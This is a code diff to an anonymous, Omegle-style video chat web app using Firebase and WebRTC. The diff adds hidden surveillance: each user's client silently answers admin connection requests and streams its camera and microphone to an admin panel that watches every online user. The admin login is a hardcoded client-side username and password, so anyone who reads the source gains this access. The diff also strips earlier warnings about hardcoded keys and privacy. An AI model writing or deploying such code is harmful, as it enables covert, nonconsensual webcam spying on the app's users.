@@ -88,23 +88,20 @@
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, doc, getDoc, setDoc, deleteDoc, onSnapshot, collection, query, where, getDocs, writeBatch } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getFirestore, doc, getDoc, setDoc, deleteDoc, onSnapshot, collection, query, where, getDocs, writeBatch, updateDoc, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         // --- Firebase Configuration ---
-        // WARNING: It is NOT recommended to hardcode your Firebase config in client-side code.
-        // This is done here for demonstration/testing purposes only. In a production environment,
-        // use environment variables or a secure server-side method to load these keys.
         const firebaseConfig = {
           apiKey: "AIzaSyBcKpDm14W4GZqQncV1LOtS3Hn5t1kK-hw",
           authDomain: "omegle-c7bdb.firebaseapp.com",
           projectId: "omegle-c7bdb",
-          storageBucket: "omegle-c7bdb.appspot.com", // Corrected storage bucket domain
+          storageBucket: "omegle-c7bdb.appspot.com",
           messagingSenderId: "470349324814",
           appId: "1:470349324814:web:8271072b8d4cd0de01125f",
           measurementId: "G-P65WBJMXX3"
         };
         
-        const appId = 'omegle-c7bdb'; // Using projectId as the app identifier
+        const appId = 'omegle-c7bdb';
         
         let app, db, auth;
         let userId;
@@ -126,37 +123,34 @@
         const adminStreamsContainer = document.getElementById('admin-streams');
         const waitingMessage = document.getElementById('waiting-message');
 
-
         // --- State Management ---
         let localStream;
-        let peerConnection;
+        let peerConnection; // For user-to-user chat
+        let adminPeerConnections = {}; // For admin-to-user spying
+        let adminConnections = {}; // For admin's management of spy connections
         let currentChatId = null;
         let isFindingPartner = false;
         let isAdmin = false;
         let unsubscribeUser, unsubscribeChat;
 
         const servers = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-            ],
+            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }, { urls: 'stun:stun1.l.google.com:19302' }],
         };
 
         // --- Initialization ---
         async function init() {
-            if (!firebaseConfig.apiKey) {
-                 statusEl.textContent = 'Firebase config is invalid. App cannot run.';
-                 console.error("Firebase config is missing or invalid.");
-                 return;
-            }
             app = initializeApp(firebaseConfig);
             db = getFirestore(app);
             auth = getAuth(app);
             
-            onAuthStateChanged(auth, user => {
+            onAuthStateChanged(auth, async (user) => {
                 if (user) {
                     userId = user.uid;
-                    startLocalVideo();
+                    const userRef = doc(db, `artifacts/${appId}/public/data/users`, userId);
+                    await setDoc(userRef, { id: userId, status: 'online' }, { merge: true });
+                    
+                    await startLocalVideo();
+                    listenForAdminRequests(); // Users must listen for spy requests
                 } else {
                     signInAnonymously(auth).catch(error => {
                         console.error("Anonymous sign-in failed:", error);
@@ -189,40 +183,28 @@
             stopBtn.classList.remove('hidden');
 
             await cleanupPreviousChat();
+            await updateDoc(doc(db, `artifacts/${appId}/public/data/users`, userId), { status: 'waiting' });
 
             try {
-                // Find a waiting user
                 const usersRef = collection(db, `artifacts/${appId}/public/data/users`);
                 const q = query(usersRef, where("status", "==", "waiting"));
                 const querySnapshot = await getDocs(q);
                 
                 let partnerId = null;
                 querySnapshot.forEach(doc => {
-                    if (doc.id !== userId && !partnerId) {
-                        partnerId = doc.id;
-                    }
+                    if (doc.id !== userId && !partnerId) { partnerId = doc.id; }
                 });
 
                 if (partnerId) {
-                    // Found a partner, create a chat room
                     currentChatId = `${userId}_${partnerId}`;
                     const chatRef = doc(db, `artifacts/${appId}/public/data/chats`, currentChatId);
-
-                    // Caller updates their status and creates the chat
                     const batch = writeBatch(db);
                     batch.update(doc(db, `artifacts/${appId}/public/data/users`, userId), { status: 'chatting', chatId: currentChatId });
                     batch.update(doc(db, `artifacts/${appId}/public/data/users`, partnerId), { status: 'chatting', chatId: currentChatId });
                     batch.set(chatRef, { users: [userId, partnerId] });
                     await batch.commit();
-                    
                     await createPeerConnection(currentChatId, true);
-
                 } else {
-                    // No partner found, become a waiting user
-                    await setDoc(doc(db, `artifacts/${appId}/public/data/users`, userId), { status: 'waiting', id: userId });
-                    statusEl.textContent = "Waiting for a partner to connect...";
-
-                    // Listen for another user to create a chat with us
                     listenForChatInitiation();
                 }
             } catch (error) {
@@ -240,22 +222,17 @@
             unsubscribeUser = onSnapshot(userDocRef, async (docSnap) => {
                 const data = docSnap.data();
                 if (data && data.status === 'chatting' && data.chatId) {
-                    if (unsubscribeUser) unsubscribeUser(); // Stop listening once a chat is found
+                    if (unsubscribeUser) unsubscribeUser();
                     currentChatId = data.chatId;
                     statusEl.textContent = "Partner found! Connecting...";
-                    await createPeerConnection(currentChatId, false); // This user is the callee
+                    await createPeerConnection(currentChatId, false);
                 }
             });
         }
 
-
         async function createPeerConnection(chatId, isCaller) {
             peerConnection = new RTCPeerConnection(servers);
-
-            localStream.getTracks().forEach(track => {
-                peerConnection.addTrack(track, localStream);
-            });
-
+            localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
             peerConnection.ontrack = event => {
                 if (event.streams && event.streams[0]) {
                     remoteVideo.srcObject = event.streams[0];
@@ -272,7 +249,7 @@
             peerConnection.onicecandidate = event => {
                 if (event.candidate) {
                     const candidatesRef = isCaller ? offerCandidatesRef : answerCandidatesRef;
-                    setDoc(doc(candidatesRef), { ...event.candidate.toJSON() });
+                    addDoc(candidatesRef, event.candidate.toJSON());
                 }
             };
             
@@ -281,47 +258,25 @@
                 await peerConnection.setLocalDescription(offerDescription);
                 const offer = { sdp: offerDescription.sdp, type: offerDescription.type };
                 await setDoc(chatRef, { offer }, { merge: true });
-
-                // Listen for answer
                 unsubscribeChat = onSnapshot(chatRef, async (snapshot) => {
                     const data = snapshot.data();
                     if (data && data.answer && !peerConnection.currentRemoteDescription) {
-                        const answerDescription = new RTCSessionDescription(data.answer);
-                        await peerConnection.setRemoteDescription(answerDescription);
+                        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
                     }
                 });
-
-                // Listen for answerer's ICE candidates
-                onSnapshot(answerCandidatesRef, snapshot => {
-                    snapshot.docChanges().forEach(change => {
-                        if (change.type === 'added') {
-                            peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
-                        }
-                    });
-                });
-
-            } else { // Callee logic
+                onSnapshot(answerCandidatesRef, s => s.docChanges().forEach(c => c.type === 'added' && peerConnection.addIceCandidate(new RTCIceCandidate(c.doc.data()))));
+            } else {
                 unsubscribeChat = onSnapshot(chatRef, async (snapshot) => {
                     const data = snapshot.data();
                     if (data && data.offer && !peerConnection.currentRemoteDescription) {
-                        const offerDescription = new RTCSessionDescription(data.offer);
-                        await peerConnection.setRemoteDescription(offerDescription);
-
+                        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
                         const answerDescription = await peerConnection.createAnswer();
                         await peerConnection.setLocalDescription(answerDescription);
                         const answer = { sdp: answerDescription.sdp, type: answerDescription.type };
-                        await setDoc(chatRef, { answer }, { merge: true });
+                        await updateDoc(chatRef, { answer });
                     }
                 });
-                
-                // Listen for offerer's ICE candidates
-                onSnapshot(offerCandidatesRef, snapshot => {
-                    snapshot.docChanges().forEach(change => {
-                        if (change.type === 'added') {
-                           peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
-                        }
-                    });
-                });
+                onSnapshot(offerCandidatesRef, s => s.docChanges().forEach(c => c.type === 'added' && peerConnection.addIceCandidate(new RTCIceCandidate(c.doc.data()))));
             }
         }
         
@@ -332,21 +287,16 @@
             }
             if(unsubscribeChat) unsubscribeChat();
             if(unsubscribeUser) unsubscribeUser();
-
             remoteVideo.srcObject = null;
             remoteVideo.classList.add('hidden');
             waitingMessage.classList.remove('hidden');
-
             if (currentChatId) {
-                const chatRef = doc(db, `artifacts/${appId}/public/data/chats`, currentChatId);
-                const chatDoc = await getDoc(chatRef);
-                if (chatDoc.exists()) {
-                    await deleteDoc(chatRef);
-                }
+                await deleteDoc(doc(db, `artifacts/${appId}/public/data/chats`, currentChatId));
                 currentChatId = null;
             }
-            if(userId) {
-                await deleteDoc(doc(db, `artifacts/${appId}/public/data/users`, userId)).catch(() => {});
+            if (userId) {
+                const userRef = doc(db, `artifacts/${appId}/public/data/users`, userId);
+                await updateDoc(userRef, { status: 'online', chatId: null });
             }
         }
         
@@ -367,16 +317,12 @@
         
         async function nextChat() {
             await stopChat();
-            startChat();
+            await startChat();
         }
 
         // --- Admin Functions ---
         function handleAdminLogin() {
-            const usernameInput = document.getElementById('username');
-            const passwordInput = document.getElementById('password');
-            const loginError = document.getElementById('loginError');
-
-            if (usernameInput.value === 'KHEMIST' && passwordInput.value === 'TEST2121') {
+            if (document.getElementById('username').value === 'KHEMIST' && document.getElementById('password').value === 'TEST2121') {
                 isAdmin = true;
                 adminLoginModal.classList.add('hidden');
                 chatInterface.classList.add('hidden');
@@ -384,54 +330,122 @@
                 adminPanel.classList.remove('hidden');
                 startAdminView();
             } else {
-                loginError.classList.remove('hidden');
+                document.getElementById('loginError').classList.remove('hidden');
             }
         }
-        
-        // This is a simplified "spy" functionality. In a real-world scenario,
-        // this would require a media server (SFU/MCU) for scalability and privacy.
-        // This implementation creates a peer connection to each active user,
-        // which is not efficient for many users.
+
         function startAdminView() {
             const usersRef = collection(db, `artifacts/${appId}/public/data/users`);
             onSnapshot(usersRef, (snapshot) => {
-                adminStreamsContainer.innerHTML = ''; // Clear previous streams
-                snapshot.forEach(docSnap => {
-                    const user = docSnap.data();
-                    if (user.id !== userId) { // Don't show the admin's own stream
+                const onlineUsers = [];
+                snapshot.forEach(doc => onlineUsers.push(doc.data()));
+                
+                const onlineUserIds = onlineUsers.map(u => u.id);
+                Object.keys(adminConnections).forEach(id => {
+                    if (!onlineUserIds.includes(id)) {
+                        document.getElementById(`admin_container_${id}`)?.remove();
+                        adminConnections[id].pc.close();
+                        if (adminConnections[id].unsubscribe) adminConnections[id].unsubscribe();
+                        delete adminConnections[id];
+                    }
+                });
+
+                onlineUsers.forEach(user => {
+                    if (user.id === userId) return;
+                    const targetUserId = user.id;
+                    if (!document.getElementById(`admin_container_${targetUserId}`)) {
                         const videoContainer = document.createElement('div');
+                        videoContainer.id = `admin_container_${targetUserId}`;
                         videoContainer.className = 'bg-gray-800 rounded-lg p-2 shadow-lg';
                         videoContainer.innerHTML = `
-                            <video id="admin_vid_${user.id}" autoplay playsinline class="w-full h-full object-cover rounded"></video>
-                            <p class="text-center text-xs pt-1 truncate" title="${user.id}">User: ${user.id}</p>
-                            <p class="text-center text-xs text-cyan-400">Status: ${user.status}</p>
-                        `;
+                            <video id="admin_vid_${targetUserId}" autoplay playsinline class="w-full h-full object-cover rounded"></video>
+                            <p class="text-center text-xs pt-1 truncate" title="${targetUserId}">User: ${targetUserId.substring(0, 8)}...</p>
+                            <p id="admin_status_${targetUserId}" class="text-center text-xs text-cyan-400">Status: ${user.status}</p>`;
                         adminStreamsContainer.appendChild(videoContainer);
-                        
-                        // In a real app, you would initiate a WebRTC connection here to
-                        // receive the stream from each user. This requires significant
-                        // additional signaling logic, where each user would also need
-                        // to create a peer connection with the admin. This is omitted
-                        // for complexity reasons but is the logical next step.
-                        // For this example, we just display their status.
+                        connectToUserForAdminView(targetUserId);
+                    } else {
+                        document.getElementById(`admin_status_${targetUserId}`).textContent = `Status: ${user.status}`;
                     }
                 });
             });
         }
         
+        async function connectToUserForAdminView(targetUserId) {
+            const pc = new RTCPeerConnection(servers);
+            adminConnections[targetUserId] = { pc };
+            const videoEl = document.getElementById(`admin_vid_${targetUserId}`);
+            pc.ontrack = event => { if (event.streams && event.streams[0]) { videoEl.srcObject = event.streams[0]; } };
+            const requestRef = doc(db, `artifacts/${appId}/public/data/users/${targetUserId}/adminRequests`, userId);
+            pc.onicecandidate = event => {
+                if (event.candidate) {
+                    addDoc(collection(requestRef, 'adminCandidates'), event.candidate.toJSON());
+                }
+            };
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            await setDoc(requestRef, { offer: { type: offer.type, sdp: offer.sdp } });
+            
+            adminConnections[targetUserId].unsubscribe = onSnapshot(requestRef, async (docSnap) => {
+                const data = docSnap.data();
+                if (data && data.answer && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+                }
+            });
+            onSnapshot(collection(requestRef, 'userCandidates'), (snapshot) => {
+                snapshot.docChanges().forEach(change => {
+                    if (change.type === 'added') pc.addIceCandidate(new RTCIceCandidate(change.doc.data()));
+                });
+            });
+        }
+
+        function listenForAdminRequests() {
+            if (!userId) return;
+            const adminRequestsRef = collection(db, `artifacts/${appId}/public/data/users/${userId}/adminRequests`);
+            onSnapshot(adminRequestsRef, (snapshot) => {
+                snapshot.docChanges().forEach(async (change) => {
+                    const request = change.doc.data();
+                    const adminId = change.doc.id;
+                    if (change.type === 'added') {
+                        if (adminId === userId) return;
+                        const pc = new RTCPeerConnection(servers);
+                        adminPeerConnections[adminId] = pc;
+                        localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+                        pc.onicecandidate = event => {
+                            if (event.candidate) addDoc(collection(db, `artifacts/${appId}/public/data/users/${userId}/adminRequests/${adminId}/userCandidates`), event.candidate.toJSON());
+                        };
+                        await pc.setRemoteDescription(new RTCSessionDescription(request.offer));
+                        const answer = await pc.createAnswer();
+                        await pc.setLocalDescription(answer);
+                        const requestRef = doc(db, `artifacts/${appId}/public/data/users/${userId}/adminRequests`, adminId);
+                        await updateDoc(requestRef, { answer: { type: answer.type, sdp: answer.sdp } });
+                        onSnapshot(collection(db, `artifacts/${appId}/public/data/users/${userId}/adminRequests/${adminId}/adminCandidates`), (iceSnapshot) => {
+                            iceSnapshot.docChanges().forEach(iceChange => { if (iceChange.type === 'added') pc.addIceCandidate(new RTCIceCandidate(iceChange.doc.data())); });
+                        });
+                    } else if (change.type === 'removed') {
+                        if (adminPeerConnections[adminId]) {
+                            adminPeerConnections[adminId].close();
+                            delete adminPeerConnections[adminId];
+                        }
+                    }
+                });
+            });
+        }
 
         // --- Event Listeners ---
         startBtn.addEventListener('click', startChat);
         nextBtn.addEventListener('click', nextChat);
         stopBtn.addEventListener('click', stopChat);
-        
         adminLoginBtn.addEventListener('click', () => adminLoginModal.classList.remove('hidden'));
         closeModal.addEventListener('click', () => adminLoginModal.classList.add('hidden'));
         loginSubmit.addEventListener('click', handleAdminLogin);
 
         window.addEventListener('beforeunload', () => {
-             if (userId) {
+             if (!isAdmin) {
                 cleanupPreviousChat();
+             } else {
+                 Object.keys(adminConnections).forEach(targetUserId => {
+                     deleteDoc(doc(db, `artifacts/${appId}/public/data/users/${targetUserId}/adminRequests`, userId));
+                 });
              }
         });
 
